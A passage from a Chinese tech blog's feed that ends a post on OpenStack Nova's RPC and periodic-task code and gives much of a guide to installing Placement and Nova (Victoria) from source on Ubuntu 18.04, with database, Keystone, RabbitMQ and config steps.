class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">object_class_action_versions</span>(<span class="params">self, context, objname, objmethod,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 object_versions, args, kwargs</span>):</span></span><br><span class="line">    cctxt = self.client.prepare()</span><br><span class="line">    <span class="keyword">return</span> cctxt.call(context, <span class="string">&#x27;object_class_action_versions&#x27;</span>,</span><br><span class="line">                      objname=objname, objmethod=objmethod,</span><br><span class="line">                      object_versions=object_versions,</span><br><span class="line">                      args=args, kwargs=kwargs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cache_images</span>(<span class="params">self, ctxt, aggregate, image_ids</span>):</span></span><br><span class="line">    version = <span class="string">&#x27;1.21&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.client.can_send_version(version):</span><br><span class="line">        <span class="keyword">raise</span> exception.NovaException(<span class="string">&#x27;Conductor RPC version pin does not &#x27;</span></span><br><span class="line">                                      <span class="string">&#x27;allow cache_images() to be called&#x27;</span>)</span><br><span class="line">    cctxt = self.client.prepare(version=version)</span><br><span class="line">    cctxt.cast(ctxt, <span class="string">&#x27;cache_images&#x27;</span>, aggregate=aggregate,</span><br><span class="line">               image_ids=image_ids)</span><br></pre></td></tr></table></figure><p>ç”± oslo_messaging/rpc/client.py å®ç°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cast</span>(<span class="params">self, ctxt, method, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Invoke a method and return immediately. See RPCClient.cast().&quot;&quot;&quot;</span></span><br><span class="line">    msg = self._make_message(ctxt, method, kwargs)</span><br><span class="line">    msg_ctxt = self.serializer.serialize_context(ctxt)</span><br><span class="line"></span><br><span class="line">    self._check_version_cap(msg.get(<span class="string">&#x27;version&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        self.transport._send(self.target, msg_ctxt, msg,</span><br><span class="line">                             retry=self.retry,</span><br><span class="line">                             transport_options=self.transport_options)</span><br><span class="line">    <span class="keyword">except</span> driver_base.TransportDriverError <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">raise</span> ClientSendError(self.target, ex)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call</span>(<span class="params">self, ctxt, method, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Invoke a method and wait for a reply. See RPCClient.call().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.target.fanout:</span><br><span class="line">        <span class="keyword">raise</span> exceptions.InvalidTarget(<span class="string">&#x27;A call cannot be used with fanout&#x27;</span>,</span><br><span class="line">                                       self.target)</span><br><span class="line"></span><br><span class="line">    msg = self._make_message(ctxt, method, kwargs)</span><br><span class="line">    msg_ctxt = self.serializer.serialize_context(ctxt)</span><br><span class="line"></span><br><span class="line">    timeout = self.timeout</span><br><span class="line">    <span class="keyword">if</span> self.timeout <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        timeout = self.conf.rpc_response_timeout</span><br><span class="line"></span><br><span class="line">    cm_timeout = self.call_monitor_timeout</span><br><span class="line"></span><br><span class="line">    self._check_version_cap(msg.get(<span class="string">&#x27;version&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = \</span><br><span class="line">            self.transport._send(self.target, msg_ctxt, msg,</span><br><span class="line">                                 wait_for_reply=<span class="literal">True</span>, timeout=timeout,</span><br><span class="line">                                 call_monitor_timeout=cm_timeout,</span><br><span class="line">                                 retry=self.retry,</span><br><span class="line">                                 transport_options=self.transport_options)</span><br><span class="line">    <span class="keyword">except</span> driver_base.TransportDriverError <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="keyword">raise</span> ClientSendError(self.target, ex)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.serializer.deserialize_entity(ctxt, result)</span><br></pre></td></tr></table></figure><p>å…³äºå‘¨æœŸä»»åŠ¡ï¼Œnova/scheduler/manager.py ä¸­ä½¿ç”¨ <code>@periodic_task.periodic_task</code> è£…é¥°çš„æ–¹æ³•å°†ä¼šè¢«å‘¨æœŸè°ƒç”¨ï¼Œä» scheduler çš„è°ƒè¯•æ—¥å¿—å¯ä»¥çœ‹åˆ°å‘¨æœŸä»»åŠ¡çš„è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">********************************************************************* log_opt_values /home/jck/.<span class="built_in">local</span>/lib/python3.6/site-packages/oslo_config/cfg.py:2591</span><br><span class="line">2021-05-18 05:53:17.030 3501 DEBUG oslo_service.periodic_task [req-66b43add-49c7-4f33-8f6b-1e33cb9f0123 - - - - -] Running periodic task SchedulerManager._run_periodic_tasks run_periodic_tasks /home/jck/.<span class="built_in">local</span>/lib/python3.6/site-packages/oslo_service/periodic_task.py:211</span><br><span class="line">2021-05-18 05:53:39.072 3500 DEBUG oslo_service.periodic_task [req-8436b3e2-96d1-4f15-8ae8-b596cee05536 - - - - -] Running periodic task SchedulerManager._run_periodic_tasks run_periodic_tasks /home/jck/.<span class="built_in">local</span>/lib/python3.6/site-packages/oslo_service/periodic_task.py:211</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>å¯¹åº”äº nova/scheduler/manager.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@periodic_task.periodic_task(<span class="params">spacing=CONF.scheduler.periodic_task_interval,</span></span></span><br><span class="line"><span class="meta"><span class="params">                             run_immediately=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_run_periodic_tasks</span>(<span class="params">self, context</span>):</span></span><br><span class="line">    self.driver.run_periodic_tasks(context)</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå‘¨æœŸä»»åŠ¡çš„æœ‰ nova-scheduler å’Œ nova-compute ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è®¡ç®—èŠ‚ç‚¹ nova-compute ä¸ŠæŠ¥èµ„æºä¿¡æ¯ï¼Œnova-scheduler è¯»å–æ•°æ®åº“ï¼Œæ›´æ–°èµ„æºä¿¡æ¯ç¼“å­˜ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://docs.openstack.org/nova/latest/user/architecture.html">Nova System Architecture</a></li><li><a href="https://docs.openstack.org/nova/latest/install/get-started-compute.html">Compute service overview</a></li><li><a href="https://docs.openstack.org/nova/latest/reference/rpc.html">AMQP and Nova</a></li><li><a href="https://docs.openstack.org/nova/latest/reference/scheduling.html">Scheduling</a></li><li><a href="https://docs.openstack.org/nova/latest/user/cellsv2-layout.html">Cells Layout (v2)</a></li><li><a href="https://www.rabbitmq.com/tutorials/amqp-concepts.html">AMQP 0-9-1 Model Explained</a></li><li><a href="https://rabbitmq.mr-ping.com/AMQP/AMQP_0-9-1_Model_Explained.html">AMQP 0-9-1 ç®€ä»‹</a></li><li><a href="https://docs.openstack.org/nova/latest/admin/metadata-service.html">Metadata service</a></li><li><a href="https://docs.openstack.org/nova/queens/reference/gmr.html">Guru Meditation Reports</a></li></ul>]]></content>
    
    
    <summary type="html">Victoria ç‰ˆæœ¬ Nova æ•´ä½“æ¶æ„æ¦‚è§ˆï¼Œæºç é˜…è¯»ï¼Œå¯åŠ¨æµç¨‹åˆ†æ</summary>
    
    
    
    <category term="OpenStack" scheme="https://jckling.github.io/categories/OpenStack/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu 18.04 æºç å®‰è£… Placement + Nova (Victoria)</title>
    <link href="https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Nova%20(Victoria)/"/>
    <id>https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Nova%20(Victoria)/</id>
    <published>2021-05-13T07:52:19.000Z</published>
    <updated>2021-10-11T13:39:04.665Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>åœ¨æºç éƒ¨ç½² Keystone å’Œ Glance ä¹‹åï¼Œç»§ç»­è¿›è¡Œ Nova çš„éƒ¨ç½²ã€‚ç¯å¢ƒè®¾å®šå’Œ Keystone éƒ¨ç½²ç›¸å…³æ“ä½œè§ <a href="https://jckling.github.io/2021/05/13/OpenStack/Ubuntu18.04%20%E6%BA%90%E7%A0%81%E5%AE%89%E8%A3%85%20Keystone%20%28Victoria%29/">Ubuntu 18.04 æºç å®‰è£… Keystone (Victoria)</a> ã€‚</p><h1 id="Placement"><a href="#Placement" class="headerlink" title="Placement"></a>Placement</h1><p>Placement ç”¨äºç®¡ç†èµ„æºï¼Œæ ¸å¿ƒåŠŸèƒ½æ˜¯å¸®åŠ©ç”¨æˆ·å¯»æ‰¾æ»¡è¶³èµ„æºéœ€æ±‚çš„è®¾å¤‡ï¼ŒPlacement æä¾› REST APIï¼Œå¹¶ä½¿ç”¨ json æ ¼å¼äº¤æ¢æ•°æ®ã€‚ä½¿ç”¨ Placement æœåŠ¡çš„åŒ…æ‹¬ Novaã€Neutron ç­‰ç»„ä»¶ï¼Œå› æ­¤åœ¨éƒ¨ç½² Nova å‰éœ€è¦éƒ¨ç½² Placement ï¼Œç®¡ç†è®¡ç®—èµ„æºï¼ˆä¸»æœºï¼‰ã€‚</p><h2 id="æ•°æ®åº“é…ç½®"><a href="#æ•°æ®åº“é…ç½®" class="headerlink" title="æ•°æ®åº“é…ç½®"></a>æ•°æ®åº“é…ç½®</h2><p>MySQL æ•°æ®åº“é…ç½®ï¼Œå¯†ç  mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿æ¥æ•°æ®åº“</span></span><br><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> placement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> placement.* <span class="keyword">TO</span> <span class="string">&#x27;placement&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;PLACEMENT_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> placement.* <span class="keyword">TO</span> <span class="string">&#x27;placement&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;PLACEMENT_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="èº«ä»½è®¤è¯å’Œ-API-é…ç½®"><a href="#èº«ä»½è®¤è¯å’Œ-API-é…ç½®" class="headerlink" title="èº«ä»½è®¤è¯å’Œ API é…ç½®"></a>èº«ä»½è®¤è¯å’Œ API é…ç½®</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º placement</span></span><br><span class="line">openstack user create --domain default --password-prompt placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user placement admin</span><br><span class="line"><span class="comment"># æ— è¾“å‡º</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæœåŠ¡å®ä½“å’ŒæœåŠ¡ API ç«¯ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name placement --description <span class="string">&quot;Placement API&quot;</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne placement public http://127.0.0.1:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement internal http://127.0.0.1:8778</span><br><span class="line">openstack endpoint create --region RegionOne placement admin http://127.0.0.1:8778</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…ä¾èµ–"><a href="#å®‰è£…ä¾èµ–" class="headerlink" title="å®‰è£…ä¾èµ–"></a>å®‰è£…ä¾èµ–</h2><p>ä¸‹è½½ Placement æºç ï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/placement.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>è¿›å…¥ Placement ç›®å½•å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ pip å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git init</span></span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">pip install -r test-requirements.txt</span><br><span class="line">pip install -e .</span><br></pre></td></tr></table></figure><h2 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h2><p>ä½¿ç”¨ tox ç”Ÿæˆé…ç½®æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tox -e genconfig</span><br></pre></td></tr></table></figure><p>æ‰‹åŠ¨åˆ›å»ºç›®å½•ï¼Œå°†é…ç½®æ–‡ä»¶æ‹·è´è¿‡å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–‡ä»¶å¤¹</span></span><br><span class="line">sudo mkdir /etc/placement</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‹·è´é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo cp etc/placement/placement.conf.sample /etc/placement/placement.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">sudo vim /etc/placement/placement.conf</span><br></pre></td></tr></table></figure><p>åœ¨ç›¸åº”å°èŠ‚æ·»åŠ é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[placement_database]</span></span><br><span class="line"><span class="attr">connection</span> = mysql+pymysql://placement:PLACEMENT_DBPASS@<span class="number">127.0</span>.<span class="number">0.1</span>/placement</span><br><span class="line"></span><br><span class="line"><span class="section">[api]</span></span><br><span class="line"><span class="attr">auth_strategy</span> = keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[keystone_authtoken]</span></span><br><span class="line"><span class="attr">auth_url</span> = http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/v3</span><br><span class="line"><span class="comment">#memcached_servers = 127.0.0.1:11211</span></span><br><span class="line"><span class="attr">auth_type</span> = password</span><br><span class="line"><span class="attr">project_domain_name</span> = Default</span><br><span class="line"><span class="attr">user_domain_name</span> = Default</span><br><span class="line"><span class="attr">project_name</span> = service</span><br><span class="line"><span class="attr">username</span> = placement</span><br><span class="line"><span class="attr">password</span> = placement</span><br></pre></td></tr></table></figure><h2 id="éƒ¨ç½²-Placement"><a href="#éƒ¨ç½²-Placement" class="headerlink" title="éƒ¨ç½² Placement"></a>éƒ¨ç½² Placement</h2><p>å®‰è£… Placement</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>å¯ç”¨æœåŠ¡</p><p><em>PSï¼šæ‰“å°çš„æ—¥å¿—ä¿¡æ¯æç¤ºåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸è¦ä½¿ç”¨ <code>placement-api</code></em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¡«å……æ•°æ®åº“</span></span><br><span class="line">.tox/shared/bin/placement-manage db sync</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‡å¯ Apache</span></span><br><span class="line">service apache2 restart</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ç”¨æœåŠ¡</span></span><br><span class="line">placement-api --port 8778</span><br></pre></td></tr></table></figure><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><p>éªŒè¯æœåŠ¡æ­£å¸¸è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥è¯¢æœåŠ¡çŠ¶æ€</span></span><br><span class="line">placement-status upgrade check</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/06/06/GiYVxod6LCSTstw.png"><h1 id="Nova"><a href="#Nova" class="headerlink" title="Nova"></a>Nova</h1><p>Nova æœ¬èº«åŒ…å«å¤šä¸ªç»„ä»¶ï¼Œå¯¹å¤–æä¾› RESTful APIï¼Œå†…éƒ¨ç»„ä»¶ä½¿ç”¨ RPC å’Œæ¶ˆæ¯é˜Ÿåˆ—ä¼ é€’æ¶ˆæ¯ã€‚è€Œä¸”æ¯ä¸ªå†…éƒ¨ç»„ä»¶éƒ½å¯ä»¥æ¨ªå‘æ‰©å±•ï¼Œéƒ¨ç½²å¤šä¸ªã€‚</p><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>å®‰è£… rabbitmqï¼ˆå®˜æ–¹æ¨èï¼Œä¹Ÿæ”¯æŒå…¶ä»–å‡ ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install rabbitmq-server -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ  openstack ç”¨æˆ·</span></span><br><span class="line">sudo rabbitmqctl add_user openstack RABBIT_PASS</span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒé™è®¾ç½®</span></span><br><span class="line">sudo rabbitmqctl set_permissions openstack <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span> <span class="string">&quot;.*&quot;</span></span><br></pre></td></tr></table></figure><p>MySQL æ•°æ®åº“é…ç½®ï¼Œå¯†ç  mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿æ¥æ•°æ®åº“</span></span><br><span class="line">sudo mysql -u root -p</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> nova_api;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> nova;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> nova_cell0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova_api.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova_api.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova_cell0.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> nova_cell0.* <span class="keyword">TO</span> <span class="string">&#x27;nova&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">&#x27;NOVA_DBPASS&#x27;</span>;</span><br></pre></td></tr></table></figure><p>èº«ä»½è®¤è¯å’Œ API é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åŠ è½½ç¯å¢ƒå˜é‡</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºç”¨æˆ·ï¼Œè®¾ç½®å¯†ç ä¸º nova</span></span><br><span class="line">openstack user create --domain default --password-prompt nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†ç”¨æˆ·æ·»åŠ åˆ° admin è§’è‰²</span></span><br><span class="line">openstack role add --project service --user nova admin</span><br><span class="line"><span class="comment"># æ— è¾“å‡º</span></span><br></pre></td></tr></table></figure><p>åˆ›å»ºæœåŠ¡å®ä½“å’ŒæœåŠ¡ API ç«¯ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡å®ä½“</span></span><br><span class="line">openstack service create --name nova --description <span class="string">&quot;OpenStack Compute&quot;</span> compute</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºæœåŠ¡ API ç«¯ç‚¹ï¼ˆendpointï¼‰</span></span><br><span class="line">openstack endpoint create --region RegionOne compute public http://127.0.0.1:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute internal http://127.0.0.1:8774/v2.1</span><br><span class="line">openstack endpoint create --region RegionOne compute admin http://127.0.0.1:8774/v2.1</span><br></pre></td></tr></table></figure><h2 id="éƒ¨ç½²-Nova"><a href="#éƒ¨ç½²-Nova" class="headerlink" title="éƒ¨ç½² Nova"></a>éƒ¨ç½² Nova</h2><p>ä¸‹è½½ Nova æºç ï¼ŒæŒ‡å®š Victoria ç‰ˆæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½æºç </span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>è¿›å…¥ Nova ç›®å½•å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è¿›å…¥ç›®å½•</span></span><br><span class="line"><span class="built_in">cd</span> nova</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…ä¾èµ–</span></span><br><span class="line">sudo apt install $(bindep -b) -y</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ pip å®‰è£…ç›¸å…³ä¾èµ–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git init</span></span><br><span class="line">pip 